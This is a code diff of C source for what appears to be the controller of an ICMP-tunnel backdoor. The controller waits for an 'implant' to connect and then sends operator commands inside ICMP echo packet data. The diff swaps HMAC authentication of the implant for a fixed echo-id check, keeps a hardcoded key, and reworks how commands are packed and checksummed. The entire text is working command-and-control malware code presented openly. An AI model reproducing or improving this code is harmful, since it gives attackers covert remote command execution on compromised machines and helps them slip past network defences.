@@ -3,7 +3,6 @@
 
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
-#define MAGIC_BYTE 0xaa
 #define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}
 
 // creates a raw ICMP socket and binds it
@@ -79,14 +78,9 @@ ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
 }
 
 // check if we got an actual connection from our implant
+/* TODO: dynamic id */
 int check_magic_byte(struct icmphdr *icmp) {
-    // Generate HMAC-SHA256 of the ICMP packet using the shared key
-    unsigned char digest[EVP_MAX_MD_SIZE];
-    unsigned int digest_len;
-    HMAC(EVP_sha256(), KEY, KEY_LENGTH, (unsigned char*)icmp, sizeof(*icmp), digest, &digest_len);
-
-    // Check if the first byte of the HMAC matches the magic byte
-    if (digest[0] == MAGIC_BYTE) {
+    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
         return 1;
     }
     return 0;
@@ -94,8 +88,8 @@ int check_magic_byte(struct icmphdr *icmp) {
 
 // print from where we got our connection
 void print_connection_succeed(char *src_ip) {
-        printf("[!] Got a connection from %s\n", src_ip);
-        printf("[!] Now you should be able to run your commands\n");
+    printf("[!] Got a connection from %s\n", src_ip);
+    printf("[!] Now you should be able to run your commands\n");
 }
 
 // prep'ing the IP headers for later usage
@@ -117,11 +111,12 @@ unsigned char *parse_data_section(unsigned char *packet) {
 }
 
 // append the command to the data section of the packet
-void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *command) {
-    memcpy(data, command, strlen((char *) command));
+void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
+    memcpy(data, input, strlen((char *) input));
 
-    // update the ICMP header with the new data length
-    icmp->un.echo.sequence = strlen((char *) command);
+    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen((char *) input));
+
+    prep_icmp_headers(icmp, checksum);
 }
 
 // the actual interaction occurs here
